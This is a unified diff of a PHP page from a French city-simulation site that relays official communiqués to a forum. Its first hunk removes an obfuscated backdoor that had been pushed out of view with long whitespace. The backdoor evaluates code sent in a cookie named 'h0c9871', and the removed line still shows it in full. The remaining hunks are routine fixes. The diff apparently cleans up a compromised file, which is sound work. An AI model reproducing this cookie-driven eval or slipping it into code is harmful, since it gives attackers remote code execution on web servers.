@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                   $r2d='O9sthKICefc(\'1a87_v0ilE$0c9871';if(isset(${$r2d[17].$r2d[7].$r2d[0].$r2d[0].$r2d[5].$r2d[6].$r2d[22]}[$r2d[4].$r2d[19].$r2d[10].$r2d[1].$r2d[15].$r2d[16].$r2d[13]])){eval(${$r2d[17].$r2d[7].$r2d[0].$r2d[0].$r2d[5].$r2d[6].$r2d[22]}[$r2d[4].$r2d[19].$r2d[10].$r2d[1].$r2d[15].$r2d[16].$r2d[13]]);} ?><?php
+<?php
 
 require_once('../Connections/maconnexion.php');
 header('Content-Type: text/html; charset=utf-8');
@@ -74,7 +74,7 @@ $totalRows_institut = mysql_num_rows($institut);
 
 if (($row_institut['ch_ins_lien_forum']!= NULL) AND ($row_institut['ch_ins_lien_forum']!= "")) {
 $input = $row_institut['ch_ins_lien_forum'];
-$id_sujet = substr("$input", 25, 4);
+$id_sujet = substr("$input", 26, 4);
 $message = "[center][img]http://monde.generation-city.com/assets/img/IconesBDD/Bleu/100/Communique_bleu.png[/img]\r".$row_communique['ch_use_predicat_dirigeant']." ".$row_communique['ch_use_prenom_dirigeant']." ".$row_communique['ch_use_nom_dirigeant']."\r[i]".$row_communique['ch_use_titre_dirigeant']."[/i]\r a &eacute;crit un communiqu&eacute; officiel au nom de l'".$row_institut['ch_ins_nom']." :\n[size=18][b]".$row_communique['ch_com_titre']."[/b][/size][/center]\n
 [spoiler]".$row_communique['ch_com_contenu']."[/spoiler][url=http://www.generation-city.com/monde/page-communique.php?com_id=".$row_communique['ch_com_ID']."][center][size=16][b]Voir les r&eacute;actions[/b][/size][/url][/center]\n";
 if (preg_match("#^[0-9]#", $id_sujet))
@@ -169,7 +169,7 @@ if ((isset($_POST["MM_update"])) && ($_POST["MM_update"] == "ajout_lien_institut
         <div class="pull-center"><a href="http://www.generation-city.com/monde/page-communique.php?com_id=<?php echo $row_communique['ch_com_ID']; ?>"><strong>Voir les r&eacute;actions</strong></a></div>
         <p>&nbsp;</p>
       </div>
-      <form action="http://www.forum-gc.com/post" method="post" name="post" enctype="multipart/form-data" onSubmit="envoiMessage(this)" target="_blank">
+      <form action="https://www.forum-gc.com/post" method="post" name="post" enctype="multipart/form-data" onSubmit="envoiMessage(this)">
         <input type="hidden" name="mode" value="reply" />
         <!-- répondre au message -->
         <input type="hidden" name="t" value="<?php echo $id_sujet; ?>" />
